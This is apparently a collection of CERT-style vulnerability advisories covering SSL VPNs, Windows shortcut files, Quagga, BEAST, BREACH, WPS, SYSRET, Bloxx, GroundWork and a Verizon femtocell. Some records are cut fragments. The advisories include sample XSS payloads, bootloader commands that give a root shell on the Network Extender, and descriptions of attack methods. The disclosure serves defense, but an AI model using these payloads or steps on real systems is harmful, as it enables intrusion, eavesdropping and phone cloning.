    "body": "Web browsers enforce the same origin policy to prevent one site's active content (such as JavaScript) from accessing or modifying another site's data. For instance, active content hosted at http://<example.com>/page1.html can access DOM objects on http://<example.com>/page2.html, but cannot access objects hosted at http://<example.net>/page.html. Many clientless SSL VPN products retrieve content from different sites, then present that content as coming from the SSL VPN, effectively circumventing browser same origin restrictions.Clientless SSL VPNs provide browser-based access to internal and external resources without the need to install a traditional VPN client. Typically, these web VPNs are used to access intranet sites (such as an internal webmail server), but many have more capabilities, such as providing access to internal fileshares and remote desktop capabilities. To connect to a VPN, a web browser is used to authenticate to the web VPN, then the web VPN retrieves and presents the content from the requested pages.Web VPN servers interact with clients using a process similar to what is described below:The user presents credentials to the web VPN using a web browser. The authentication can be done through username and password submission, or can involve multi-factor authentication.The web VPN authenticates the user and assigns an ID to the session, which is sent to the user's browser in the form of a cookie.The user can then browse internal resources, such as a webmail server or intranet webserver. URLs as viewed by the user's web browser may be similar to https://<webvpnserver>/www.intranet.example.com.As the web VPN retrieves web pages, it rewrites hyperlinks so that they are accessible through the web VPN. For example, a link to http://<www.intranet.example.com>/mail.html becomes https://<webvpnserver>/www.intranet.example.com/mail.html. Cookies set by the requested webserver may be converted into globally unique cookies before being passed to the user's browser, which prevents collision between two identically named cookies from different requested domains. For example, a sessionid cookie set by intranet.example.com could be renamed to intranet.example.com_sessionid before it is sent from the web VPN to the user's browser . Additionally, the web VPN may replace references to specific HTML DOM objects, such as document.cookie. These DOM objects may be replaced with script that returns the value for that DOM object as if it had been accessed in the context of the requested site's domain. If an attacker constructs a page that obfuscates the document.cookie element in such a way as to avoid being rewritten by the web VPN, then the document.cookie object in the returned page will represent all of the user's cookies for the web VPN domain. Included in this document.cookie are the web VPN session ID cookie itself and any globally unique cookies set by sites requested through the web VPN. The attacker may then use these cookies to hijack the user's VPN session and any other sessions accessed through the web VPN that rely on cookies for session identification.Additionally, an attacker could construct a page with two frames: one hidden and one that displays a legitimate intranet site. The hidden frame could log all keys pressed in the second, benign frame and submit these keypresses as parameters to a XMLHttpRequest GET to the attacker's site, rewritten in web VPN syntax.Note that if the VPN server is allowed to connect to arbitrary Internet sites, these vulnerabilities can be exploited by any site on the Internet.. overview: Clientless SSL VPN products from multiple vendors operate in a way that breaks fundamental browser security mechanisms. An attacker could use these devices to bypass authentication or conduct other web-based attacks.. impact: By convincing a user to view a specially crafted web page, a remote attacker may be able to obtain VPN session tokens and read or modify content (including cookies, script, or HTML content) from any site accessed through the clientless SSL VPN. This effectively eliminates same origin policy restrictions in all browsers. For example, the attacker may be able to capture keystrokes while a user is interacting with a web page. Because all content runs at the privilege level of the web VPN domain, mechanisms to provide domain-based content restrictions, such as Internet Explorer security zones and the Firefox add-on NoScript, may be bypassed.

    "title": "Microsoft Windows automatically executes code specified in shortcut files",
    "body": "Microsoft Windows supports the use of shortcut or LNK files. A LNK file is a reference to a local file. A PIF file is a shortcut to a MS-DOS application. Clicking on a LNK or PIF file has essentially the same outcome as clicking on the file that is specified as the shortcut target. For example, clicking a shortcut to calc.exe will launch calc.exe, and clicking a shortcut to readme.txt will open readme.txt with the associated application for handling text files.Microsoft Windows fails to safely obtain icons for shortcut files. When Windows displays Control Panel items, it will initialize each object for the purpose of providing dynamic icon functionality. This means that a Control Panel applet will execute code when the icon is displayed in Windows. Through use of a shortcut file, an attacker can specify a malicious DLL that is to be processed within the context of the Windows Control Panel, which will result in arbitrary code execution. The specified code may reside on a USB drive, local or remote filesystem, a CD-ROM, or other locations. Viewing the location of a shortcut file with Windows Explorer is sufficient to trigger the vulnerability. By default, Microsoft Windows has AutoRun/AutoPlay features enabled. These features can cause Windows to automatically open Windows Explorer when a removable drive, such as a USB thumb drive, is connected. Other applications that display file icons can be used as an attack vector for this vulnerability as well. When used in conjunction with a WebDav resource, Internet Explorer can be used as an attack vector for this vulnerability. With the case of Internet Explorer, no user interaction beyond viewing a web page is required to trigger the vulnerability.This vulnerability is being exploited in the wild to spread malware (stuxnet) that targets control systems. Exploit code for this vulnerability is publicly available.. overview: Microsoft Windows automatically executes code specified in shortcut (LNK and PIF) files.. impact: By convincing a user to display a specially-crafted shortcut file, an attacker may be able to execute arbitrary code with the privileges of the user. Depending on the operating system and AutoRun/AutoPlay configuration, this can happen automatically by connecting a USB device. This vulnerability can also be triggered by viewing a web page with Internet Explorer or opening a document with Microsoft Office.",

Unfortunately the RNG used by the library is not cryptographically strong, and is further weakened by the use of predictable seed material. The RNG (Wichman-Hill) is not mixed with an entropy source.The seed used for all ssh connections in the library is the current time (to approximately microsecond resolution). By observing the time a connection from this library is established, the first two components of the three RNG seed can be guessed.The third component can be recovered by brute-force; trying each possible value (1..1000000).Guessing the exact seed is made easier by the 16 byte random session cookie that the library will send in its plaintext kexinit message. This cookie will be bytes 17-32 of the RNG sequence.Once the session RNG seed is recovered, an attacker can simply perform the same DH key exchange operation as the SSH library and recover the session secret. Additionally, if the ssh library is used on the server side of the connection and DSA host key is used, the private key can be recovered from the kex_dh messages. The secret signing value k is known from the RNG seed (bytes 170 - 190 of the sequence), so with the public DSA key data in the kex_dh_reply message the private part can be recovered by inverting the signature operation.. overview: The Erlang/OTP SSH library's random number generator is not cryptographically strong because it relies on predictable seed material.. impact: An attacker can recover SSH session keys and DSA host keys.",

    "body": "The Apache HTTPD Security Advisory Update 2 states:\"Background and the 2007 report==============================There are two aspects to this vulnerability. One is new, is Apache specific; and resolved with this server side fix. The other issue is fundamentally a protocol design issue dating back to 2007: http://seclists.org/bugtraq/2007/Jan/83 The contemporary interpretation of the HTTP protocol (currently) requires a server to return multiple (overlapping) ranges; in the order requested. This means that one can request a very large range (e.g. from byte 0- to the end) 100's of times in a single request. Being able to do so is an issue for (probably all) webservers and currently subject of an IETF discussion to change the protocol: http://trac.tools.ietf.org/wg/httpbis/trac/ticket/311This advisory details a problem with how Apache httpd and its so called internal 'bucket brigades' deal with serving such \"valid\" request. The problem is that currently such requests internally explode into 100's of large fetches, all of which are kept in memory in an inefficient way. This is being addressed in two ways. By making things more efficient. And by weeding out or simplifying requests deemed too unwieldy.\". overview: Apache HTTPD server contains a denial-of-service vulnerability in the way multiple overlapping ranges are handled. Both the 'Range' header and the 'Range-Request' header are vulnerable. An attack tool, commonly known as 'Apache Killer', has been released in the wild. The attack tool causes a significant increase in CPU and memory usage on the server.. impact: CPU and memory usage will spike causing a denial-of-service condition.",

    "body": "CERT-FI reports:Quagga is an open source routing software that can handle various routing protocols such as RIP, BGP and OSPF. Five vulnerabilities have been found in the BGP, OSPF and OSPFv3 components of Quagga. The vulnerabilities allow an attacker to cause a denial of service or potentially to execute his own code by sending a specially modified packets to an affected server. Routing messages are typically accepted from the routing peers. Exploiting these vulnerabilities may require an established routing session (BGP peering or OSPF/OSPFv3 adjacency) to the router.The vulnerability CVE-2011-3327 is related to the extended communities handling in BGP messages. Receiving a malformed BGP update can result in a buffer overflow and disruption of IPv4 routing.The vulnerability CVE-2011-3326 results from the handling of LSA (Link State Advertisement) states in the OSPF service. Receiving a modified Link State Update message with malicious state information can result in denial of service in IPv4 routing.The vulnerability CVE-2011-3325 is a denial of service vulnerability related to Hello message handling by the OSPF service. As Hello messages are used to initiate adjacencies, exploiting the vulnerability may be feasible from the same broadcast domain without an established adjacency. A malformed packet may result in denial of service in IPv4 routing.The vulnerabilities CVE-2011-3324 and CVE-2011-3323 are related to the IPv6 routing protocol (OSPFv3) implemented in ospf6d daemon. Receiving modified Database Description and Link State Update messages, respectively, can result in denial of service in IPv6 routing.. overview: Quagga contains five remote component vulnerabilities due to issues when handling BGP, OSPF, and OSPFv3 packets.. impact: An attacker could exploit these vulnerabilities to cause a denial-of-service crash or may execute arbitrary code on the affected server with the permissions of the Quagga software.",

Several different versions of the SSL and TLS protocols have been standardized and are in widespread use. These protocols support the use of both block-based and stream-based ciphers.A vulnerability in the way the SSL 3.0 and TLS 1.0 protocols select the initialization vector (IV) when operating in cipher-block chaining (CBC) modes allows an attacker to perform a chosen-plaintext attack on encrypted traffic. This vulnerability has been addressed in the specification for the TLS 1.1 and TLS 1.2 protocols.While this vulnerability exists in the underlying specification of the affected protocols, a practical attack called BEAST has been demonstrated in the context of a web browser and the use of the HTTPS protocol. Because of the software functionality available to an attacker in this environment, it represents the most likely attack vector and the most significant risk for affected users. An effective BEAST attack appears to require a cross-domain vulnerability that allows the attacker to issue specially crafted HTTPS requests. A blog post by Thái Duong discusses \"...a way to bypass the same-origin policy (SOP)...\" using a Java applet.. overview: A vulnerability in the specification of the SSL 3.0 and TLS 1.0 protocols could allow an attacker to decrypt encrypted traffic.. impact: An attacker with the ability to pose as a man-in-the-middle and to generate specially-crafted plaintext input could decrypt the contents of an SSL- or TLS-encrypted session.

The function populates a parameter struct (jpc_msparms_t) that is contained in a marker segment struct (jpc_ms_t). jpc_cox_getcompparms contains a loop that copies data from the input file to the jpc_msparms_t struct. The loop terminates on a value (numrlvls) derived from the input file:for (i = 0; i < compparms->numrlvls; ++i) { if (jpc_getuint8(in, &tmp)) { jpc_cox_destroycompparms(compparms); return -1; } compparms->rlvls[i].parwidthval = tmp & 0xf; compparms->rlvls[i].parheightval = (tmp >> 4) & 0xf;}numrlvls is read from the input file.

This function populates a heap buffer with data derived from the input file (in).The function contains an allocation size/type error.

This is a heap buffer overflow, which is generally considered exploitable.There are additional security implications here as well, however. The loop above is controlled by cstate->numcomps (cstate as one member: numcomps). cstate is allocated in a calling function, and is often allocated just before crg->comp. On some platforms the heap chunk allocated for cstate is located just after the heap chunk allocated for crg->comp, separated by only 4 bytes of heap accounting info. The accounting info + cstate (8 bytes after crg->comp) can be overwritten with bytes from the input file via the loop above. In these cases, the attacker can place a large number in cstate->numcomps to make the loop above iterate past the expected bound of crg->comps and copy an arbitrary number of bytes from the input file into heap (a heap buffer overflow). This enables the attacker to perform well-known heap exploitations, as well as allowing the attacker to overwrite other active heap allocations such as the callback pointers referenced in the previous bug description.. overview: Some versions of JasPer contain multiple vulnerabilities that may allow a remote, unauthenticated attacker to execute arbitrary code.. impact: By tricking a user into opening or previewing an image file in an application that decodes images with the JasPer library, an attacker can execute arbitrary code or cause a denial-of-service crash.",

    "body": "WiFi Protected Setup (WPS) is a computing standard created by the WiFi Alliance to ease the setup and securing of a wireless home network. WPS contains an authentication method called \"external registrar\" that only requires the router's PIN. By design this method is susceptible to brute force attacks against the PIN. When the PIN authentication fails the access point will send an EAP-NACK message back to the client. The EAP-NACK messages are sent in a way that an attacker is able to determine if the first half of the PIN is correct. Also, the last digit of the PIN is known because it is a checksum for the PIN. This design greatly reduces the number of attempts needed to brute force the PIN. The number of attempts goes from 10^8 to 10^4 + 10^3 which is 11,000 attempts in total.It has been reported that many wireless routers do not implement any kind of lock out policy for brute force attempts.

The fault will be handled before the stack switch, which means the exception handler will be run at ring0 with an attacker's chosen RSP causing a privilege escalation.Details from XenCVE-2012-0217 / XSA-7 - 64-bit PV guest privilege escalation vulnerabilityA vulnerability which can allow a 64-bit PV guest kernel running on a 64-bit hypervisor to escalate privileges to that of the host by arranging for a system call to return via sysret to a non-canonical RIP. Intel CPUs deliver the resulting exception in an undesirable processor state.Details from FreeBSDFreeBSD-SA-12:04.sysret: Privilege escalation when returning from kernelFreeBSD/amd64 runs on CPUs from different vendors. Due to varying behaviour of CPUs in 64 bit mode a sanity check of the kernel may be insufficient when returning from a system call. Successful exploitation of the problem can lead to local kernel privilege escalation, kernel data corruption and/or crash.Details from MicrosoftUser Mode Scheduler Memory Corruption Vulnerability - MS12-042 - ImportantAn elevation of privilege vulnerability exists in the way that the Windows User Mode Scheduler handles system requests. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full administrative rights.Mitigating Factors for User Mode Scheduler Memory Corruption VulnerabilityMitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation: An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability could not be exploited remotely or by anonymous users.This vulnerability only affects Intel x64-based versions of Windows 7 and Windows Server 2008 R2.Systems with AMD or ARM-based CPUs are not affected by this vulnerability.Details from Red HatRHSA-2012:0720-1 & RHSA-2012:0721-1: It was found that the Xen hypervisor implementation as shipped with Red Hat Enterprise Linux 5 did not properly restrict the syscall return addresses in the sysret return path to canonical addresses. An unprivileged user in a 64-bit para-virtualized guest, that is running on a 64-bit host that has an Intel CPU, could use this flaw to crash the host or, potentially, escalate their privileges, allowing them to execute arbitrary code at the hypervisor level. (CVE-2012-0217, Important)Details from some affected vendors were not available at the time of publication.. overview: Some 64-bit operating systems and virtualization software running on Intel CPU hardware are vulnerable to a local privilege escalation attack. The vulnerability may be exploited for local privilege escalation or a guest-to-host virtual machine escape.Intel claims that this vulnerability is a software implementation issue, as their processors are functioning as per their documented specifications. However, software that fails to take the Intel-specific SYSRET behavior into account may be vulnerable.. impact: A local authenticated attacker may exploit this vulnerability for operating system privilege escalation or for a guest-to-host virtual machine escape.",

    "body": "Quagga 0.99.20 and previous versions are susceptible to various denial-of-service conditions. The Quagga advisories state the following:CVE-2012-0249: Error in OSPF parsing LS-Update messages Can Cause a Crash of Quagga ospfdThe ospfd implementation of OSPF in Quagga allows a remote attacker (on a local network segment with OSPF enabled) to cause a denial of service (daemon aborts due to an assert) with a malformed OSPF LS-Update message.Program Impacted: Quagga (ospfd)Description:OSPFv2 implementation in Quagga version 0.99.20 and before does not perform a proper length check for a received LS-Update OSPF packet. A received packet, which has actually less bytes, than it is declared in its header, causes a buffer overflow, which immediately leads to a crash of OSPF protocol process and subsequent disruption of IPv4 routing.Like many other OSPF cases, exploiting this vulnerability requires an ability to form an OSPF adjacency with the attacked OSPF router and initiate a database exchange process with it. Usual OSPF security precautions (including MD5 authentication) may lower the risk of such event. Upgrading to a patched version of Quagga is recommended regardless of any other measures taken.CVE-2012-0250: Error in OSPF parsing Network-LSA messages Can Cause a Crash of Quagga ospfdThe ospfd implementation of OSPF in Quagga allows a remote attacker (on a local network segment with OSPF enabled) to cause a denial of service (daemon crash) with a malformed OSPF Network-LSA message.Program Impacted: Quagga (ospfd)Description:OSPFv2 implementation in Quagga version 0.99.20 and before does not perform a proper length check of the Network-LSA structures contained in an LS-Update OSPF packet. When an otherwise correct LS-Update OSPF packet contains a Network-LSA structure, which has its \"Length\" header field set to value bigger than the actual number of bytes in the buffer, a buffer overflow happens. This immediately leads to a crash of OSPF protocol process and subsequent disruption of IPv4 routing.Like many other OSPF cases, exploiting this vulnerability requires an ability to form an OSPF adjacency with the attacked OSPF router and initiate a database exchange process with it. Usual OSPF security precautions (including MD5 authentication) may lower the risk of such event. Upgrading to a patched version of Quagga is recommended regardless of any other measures taken.CVE-2012-0255: Error in BGP OPEN Message parsing Can Cause a Crash of Quagga bgpdThe bgpd implementation of BGP in Quagga up to (and including) 0.99.20 allows remote attackers to cause a denial of service (daemon aborts due to an assert) via BGP Open message with an invalid AS4 capability.Program Impacted: Quagga (bgpd)Description:BGP implementation in Quagga version 0.99.20 and before contains an error in processing malformed AS4 capability in the BGP OPEN message which leads to a abort (daemon aborts due to an assert) of the BGP protocol process and subsequent disruption of IP routing. When an OPEN with a malformed AS4 capability message is detected, the code fails to flush the message buffers for the peer. When the peer next connects and sends a message, the code will attempt to parse the stale, half-consumed data in the message buffer as it were a fresh BGP message. This leads to an assert and exit of the BGP daemon in the BGP OPEN message parsing code.The vulnerability is not restricted to BGP neighbors with 4-byte AS but can only be done from any configured peers (or sources spoofing the IP of a configured peer). The potential exists for this condition to be intentionally triggered, resulting in effective denial of service by crashing the BGPd. Usual BGP security precautions (including BGP MD5 authentication) may lower the risk of such event.. overview: Quagga, a routing software suite, contains multiple vulnerabilities that result in a denial-of-service condition.. impact: A remote attacker may be able to cause a denial-of-service condition.",

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') CVE-2012-2563:(1) The Bloxx Reports are vulnerable to Persistent XSS. A malicious user, who's web traffic is being filtered by the Bloxx Web Filtering could inject persistent malicious code into the Bloxx Reports. When a Bloxx administrator views reports in the administrative interface that contains the entry, the malicious code will execute. A malicious user could use this to gain administrative access to the Bloxx administrator interface or execute arbitrary code on an administrative user.Example : http://localhost/?test=<script>alert(\"XSS\");</script>(2) The following menu functions in the Bloxx administrative interface are reported to be vulnerable to Persistent XSS. A malicious lower level administrator that has access to one of these functions could inject malicious code targeting a higher level administrator to escalate privileges or execute arbitrary code.

A malicious user could craft a specialized web page and force a Bloxx administrator to execute unwanted actions on the Bloxx administrative interface in which they are currently authenticated. It is not required that the Bloxx administrator have a window open to the administrative interface. If the Bloxx administrator did not use the \"Log out\" link, even closing the browser window could still leave the session open.(4) The Bloxx Web Filtering device uses Microdasys for SSL interception. When a user tries to use HTTPS to connect to a site that does not support HTTPS, a Microdasys SSL error page is displayed to the user. This error page is vulnerable to a reflected XSS attack. A malicious user can send a crafted HTTPS URL for a site that does not support HTTPS that contains malicious code to a victim. When the victim tries to connect to the crafted URL, the Microdasys engine will try to connect over HTTPS to the URL. The connection will fail since the target site does not support HTTPS and the Microdasys SSL error page will be presented to the user which includes the unsanitized URL.Example: https://www.website.com/test.php?test=\"><script>alert(\"XSS\");</script>CWE-257: Storing Passwords in a Recoverable Format CVE-2012-2565:(5) The Bloxx administrative interface has a function to backup the current configuration and save it to a file.

The user information includes the username, administrative level, email address, and a SHA-1 hash of the password. If a malicious lower level administrator has access to the backup functionality or a malicious user has access to the backup file, they could extract the SHA-1 hashes to be cracked. No salt is implemented so the hashes can be cracked against a rainbow table. If a malicious lower level administrator also has rights to restore a backup file, they could replace the password of a higher level administrator account with a hash with their own.CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax CVE-2012-2566:(6) An unauthenticated user can bypass the IP restriction and falsify the logs for HTTPS sites by inserting the X-Forwarded-For HTTP header with the value of an authorized IP address.

    "body": "Universal Plug and Play (UPnP) is a set of network protocols designed to support automatic discovery and service configuration. The Portable SDK for UPnP Devices (libupnp) is an open source project that has its roots in the Linux SDK for UPnP Devices and software from Intel (Intel Tools for UPnP Technologies and later Developer Tools for UPnP Technologies). Intel no longer maintains or supports these tools. Many different vendors produce UPnP-enabled devices that use libupnp.As part of a large scale security research project, Rapid7 investigated internet-connected UPnP devices and found, among other security issues, multiple buffer overflow vulnerabilities in the libupnp implementation of the Simple Service Discovery Protocol (SSDP). Rapid7's report summarizes these vulnerabilities:Portable SDK for UPnP Devices unique_service_name() Buffer OverflowsThe libupnp library is vulnerable to multiple stack-based buffer overflows when handling malicious SSDP requests. This library is used by tens of millions of deployed network devices, of which approximately twenty million are exposed directly to the internet. In addition to network devices, many streaming media and file sharing applications are also exposed to attack through this library.This advisory does not address historic or current vulnerabilities in the HTTP and SOAP processing code of libupnp.Affected VersionsVersions 1.2 (Intel SDK) and 1.2.1a - 1.8.0 (Portable SDK) are affected by at least three remotely exploitable buffer overflows in the unique_service_name() function, which is called to process incoming SSDP requests on UDP port 1900. Additionally, versions prior to 1.6.17 are vulnerable to additional issues in the same function. Please see Appendix A for a review of the vulnerable code by version.Affected VendorsHundreds of vendors have used the libupnp library in their products, many of which are acting as the home routers for consumer networks. Any application linking to libupnp is likely to be affected and a list of confirmed vendors and products is provided in Appendix B. Additional details may be found in a paper and advisory from Rapid7.. overview: The Portable SDK for UPnP Devices libupnp library contains multiple buffer overflow vulnerabilities. Devices that use libupnp may also accept UPnP queries over the WAN interface, therefore exposing the vulnerabilities to the internet.. impact: A remote, unauthenticated attacker may be able to execute arbitrary code on the device or cause a denial of service.",

This can cause a denial of service (e.g., an X server segmentation fault), or could be exploited to achieve arbitrary code execution. Because the X server runs as setuid root in many configurations, an attacker could potentially use this vulnerability in those configurations to gain root privileges.To install an ARGB cursor, an application would require a connection to a running X server. Normally, X servers are configured to only accept authenticated connections from the local host, but some X servers may be configured to more permissively allow connections, and/or to allow connections over a network.\"NoScanout\" mode is enabled implicitly on NVIDIA products which lack display output connectors, and can be enabled explicitly on some other configurations with the X configuration option:Option \"UseDisplayDevice\" \"none\"NVIDIA GPU drivers for OSes other than Linux, FreeBSD, VMware ESX, and Solaris are not affected.This vulnerability has been present since NVIDIA driver version 195.22.

FairCom designed its proprietary encryption algorithm for speed and efficiency, focusing on minimizing performance loss.The encryption algorithm is proprietary to FairCom Corporation and the details are not released in any way to increase the difficulty of reverse-engineering the process.

Standard File Encryption is suitable for most needs with excellent security vs. performance tradeoffs.Faircom has come up with a new branding called \"Data Camouflage\" so it will be less likely to be confused with standard encryption algorithms, such as, AES. Faircom describes the \"Data Camouflage\" algorithm as follows:Data CamouflageUsing our Data Camouflage technique provides the means to add an extra level of confidentiality to an application’s data.

Only few components are additionally secured by the JOSSO Single-Sign-On system.2) Foundation webapp admin interface:2.1) Referer-check: The webapp is only \"secured\" by a referer check, an unauthenticated attacker is able to access the admin interface. The attacker also has write access and is able to manipulate settings as admin user and he can further exploit other vulnerabilities.2.2) Unauthenticated file disclosure & file write/modification An unauthenticated attacker is able to read arbitrary files of the operating system with the access rights of the operating system user \"nagios\" (the only \"security protection\" is the weak Referer-check from 2.1).2.3) Multiple permanent XSS vulnerabilities An unauthenticated attacker is able to store malicious JavaScript/HTML code in many places within the admin interface and hence further attack / take over admin users of GroundWork! If an administrator e.g. clicks on the \"Administration\" /\"Foundation\" menu within GroundWork, the JavaScript code will be executed automatically.3) MONARCH component: 3.1) Direct OS command injection An attacker with a valid cookie (JOSSO SSO) with at least low-privileged \"user\" access rights is able to execute arbitary operating system commands. He is able to gain access to sensitive configuration files, e.g. passwords of Nagios (and hence of many services within the monitored network) in cleartext.3.2) XML external entity injection & arbitrary XML file (over-)write The Monarch components suffer from XXE attacks where an attacker e.g. is able to read arbitrary files of the operating system (sensitive configuration files, etc.).The vulnerability can be exploited by uploading a malicious XML file within the \"Profile Importer\" component and then view this uploaded file within the same module.4) Nagios-App component4.1) Access to sensitive files, A low privileged user is able to gain access to log files or nagios configuration files (e.g. clear text passwords) just by entering the corresponding URL and including the Referer-header from 1).5) Performance component5.1) Write files & execute operating system commands An unauthenticated attacker is able to write files (filename & path can be chosen arbitrarily) with pre-given XML content with the access rights of the \"nagios\" operating system user. The XML content is partially given by the application, but can be modified by the attacker for further injection attacks. In the end it is possible to execute operating system commands, e.g. by using SSI (server-side includes) injection. Note there are additional vulnerabilities.

    "body": "Angelo Prado of Salesforce.com reports:Extending the CRIME vulnerability presented at Ekoparty 2012, an attacker can target HTTPS responses to recover data from the response body.While the CRIME attack is currently believed to be mitigated by disabling TLS/SSL/level compression, compressed HTTP responses represent a significant unmitigated vector which is currently exploitable. By injecting plaintext into an HTTPS request, an attacker can learn information about the corresponding HTTPS response by measuring its size.This relies on the attacker being able to observe the size of the cipher text received by the browser while triggering a number of strategically crafted requests to a target site. To recover a particular secret in an HTTPS response body, the attacker guesses character by character, sending a pair of requests for each guess. The correct guess will result in a smaller HTTPS response. For each guess the attacker coerces the victim's browser to issue two requests. The first request includes a payload of the form:\"target_secret_name=<already known part of secret>+<guess>+<padding>\" ...while the second request includes a payload of the form: \"target_secret_name=<already known part of secret>+<padding>+<guess>\". If the size of the first response is smaller than the second response, this indicates that the guess has a good chance of being correct. This method of sending two similar requests and comparing them is due to Duong and Rizzo. If multiple candidates are found, the following is a useful recovery mechanism: move forward in parallel with both candidates until it becomes clear which guess is correct. With a token of length 32 and a character space of size 16 (e.g. hex), the attacker needs an average of approximately 1,000 request if no recovery mechanisms are needed. In practice, we have been able to recover CSRF tokens with fewer than 4,000 requests. A browser like Google Chrome or Internet Explorer is able to issue this number of requests in under 30 seconds, including callbacks to the attacker command & control center.[In order to conduct the attack, the following conditions must be true]:HTTPS-enabled endpoint (ideally with stream ciphers like RC4, although the attack can be made to work with adaptive padding for block ciphers).The attacker must be able to measure the size of HTTPS responses. Use of HTTP-level compression (e.g. gzip).A request parameter that is reflected in the response body.A static secret in the body (e.g. CSRF token, sessionId, VIEWSTATE, PII, etc.) that can be bootstrapped (either first/last two characters are predictable and/or the secret is padded with something like KnownSecretVariableName=.An otherwise static or relatively static response. Dynamic pages do not defeat the attack, but make it much more expensive.. overview: By observing the length of compressed HTTPS responses, an attacker may be able to derive plaintext secrets from the ciphertext of an HTTPS stream.. impact: A sophisticated attacker may be able to derive plaintext secrets from the ciphertext in an HTTPS stream.",

    "title": "Verizon Wireless Network Extender multiple vulnerabilities",
    "body": "The iSEC Partners Security Advisory - 2012-003-verizon states:The Verizon Wireless Network Extender is a low-power cellular base station. It is given or sold to subscribers by mobile network operators, and works like a small cell tower, using a home Internet connection to interface with the provider network. When in range, a mobile phone will connect to a femtocell as if it were a standard cell tower. Two versions of the Network Extender were tested: the Samsung SCS-26UC4 and SCS-2U01. The Network Extender is susceptible to a number of vulnerabilities that allow console access to the device as root, using a custom HDMI cable. Exploiting these vulnerabilities can lead to a total compromise of the device, including running custom code and eavesdropping on voice, text and data communication. An additional vulnerability exists in the CDMA authentication code that allows cloning of a subscriber's phone.SCS-26UC4 Root Exploit:-----------------------The older hardware version of the Network Extender is designated \"SCS-26UC4\".It is possible to exploit a built-in delay of the Uboot bootloader to obtain console access. To be able to exploit this vulnerability, a special console cable must be created with an HDMI connector to connect to the device. Once it is possible to view boot output, the following steps will present a root shell:1) While viewing the boot output, a prompt will display: \"Press any key to interrupt boot\"2) Type \"sys\" and press <enter>3) Disable the watchdog by typing: setenv watchdog_off 14) Update the ramboot environment variable by typing: setenv ramboot version\\;echo\\;setenv\\ bootargs\\ mem=64M\\ console=ttyS0\\,57600n8\\ root=/dev/ram0\\ init=/bin/sh\\;mdocboot5) Type \"boot\" and press <enter> to boot the kernel and obtain a root shell.SCS-2U01 Root Exploit:----------------------The newer hardware version of the Network Extender is designated \"SCS-2U01\".It is possible to obtain console access to the SCS-2U01 even though the Uboot delay has been removed, using the SysReq (System Request) interrupt. The actual key combination used to send a SysReq is dependent on the terminal emulator program used on the connected computer. If successfully applied, this command will halt boot process and drop the user to a login prompt, where it is possible to login as the root user. As with the previous exploit, it is first necessary to create a console cable to be able to view and send commands to the device.1) While viewing the boot output, wait until the device attempts to extract the RFS.2) Enter <SysReq> i(1) 3) All running processes will be terminated and a login prompt will display4) Log in with the root username and password to obtain a root shell. (Note: This password is the same for all systems and is freely available on the Internet)Lack of CAVE Authentication:----------------------------The Network Extender does not appear to use Cellular Authentication and Voice Encryption (CAVE). For cellular phone authentication, the device appears to only use the ESN and MIN. These numbers can usually be obtained with physical access to a phone, or by sniffing registration packets as they transit the Network Extender. Combining the above root access flaws with a lack of proper authentication, it is possible to run custom code on the Network Extender that will obtain the ESN and MIN from any phone within range. Using these numbers, a phone can be cloned without direct physical access and without a user's knowledge, although association to the Network Extender is required.Fix Information:----------------It may not be possible to completely secure this device from unauthorized use. However, it is certainly possible to harden the device and make it more difficult to exploit. A detailed analysis should be performed on all aspects of the device, including hardware design.Proposed fixes:---------------1) The Uboot delay flaw in the SCS-26UC4 has been addressed in the upgrade to the SCS-2U01. Depending on the expected operational lifetime of the SCS-26UC4, it may be appropriate to apply a fix to these devices or to plan to remove them from the network.2) The SysReq vulnerability can be fixed by disabling the kernel variable: /proc/sys/kernel/sysrq = 0. Note: this change should be made in the kernel at compile time, rather than set via sysctl variables.3) CAVE Authentication should be implemented on the Network Extender.4) Change the root password; the current password has been published on the Internet for some time. The new root password should be extremely strong and beyond the reach of even projected password cracking ability. For example, a 40-character alphanumeric lowercase/uppercase string with symbols would be more suitable.5) Consider adding an increased system monitoring capability or tamper protections that will provide the ability to detect possible exploitation attempts. For example, monitoring certain device errors or user logins may provide information on potential break-in attempts.The fixes proposed above will mitigate the specific vulnerabilities discovered, but may not greatly increase the overall security of the system. Hardening the device can only go so far, as the system architecture itself is flawed. Because users are in physical possession of the device, it may not be possible to harden the Network Extender to the extent where it cannot be effectively exploited while also allowing it to be usable and serviceable. As long as data from the cellular handset transiting the Network Extender is available in plaintext, it will be vulnerable - even if communication is secured between the Network Extender and the internal Verizon network. Require registration of subscribers phones to specific femtocells, and enforce this on Verizon's core network. Subscribers should only be able to connect to femtocells they have been securely registered with. This prevents attackers from deploying rogue femtocells to capture arbitrary subscribers in an area. However it may still be possible for attackers to bypass the registration by isolating a subscriber from the core network and simulating phone calls or text messages and receiving responses from the device.Encrypting the communication between the handset and the carrier network end-to-end would make it much safer from eavesdroppers anywhere along the network path, including at the Network Extender. If this model of secure communication were applied to all voice, text and data traffic on the handset, the Network Extender architecture could be made significantly more secure. In this scenario, if a determined attacker were able to compromise a hardened device, data loss would be much less severe, since the data is encrypted and equivalent to what the attacker could see by sniffing their own network. This does not preclude other attacks that can be performed on encrypted data, but is a stronger and defensible architecture given the current system design.iSEC Partners stated they contacted Verizon on December 7th, 2012 and Samsung on January 3rd, 2013 for a coordinated disclosure of these vulnerabilities.. overview: iSEC Partners has reported that the Verizon Wireless Network Extender models SCS-26UC4 and SCS-2U01 made by Samsung are susceptible to a local compromise using a custom HDMI cable.

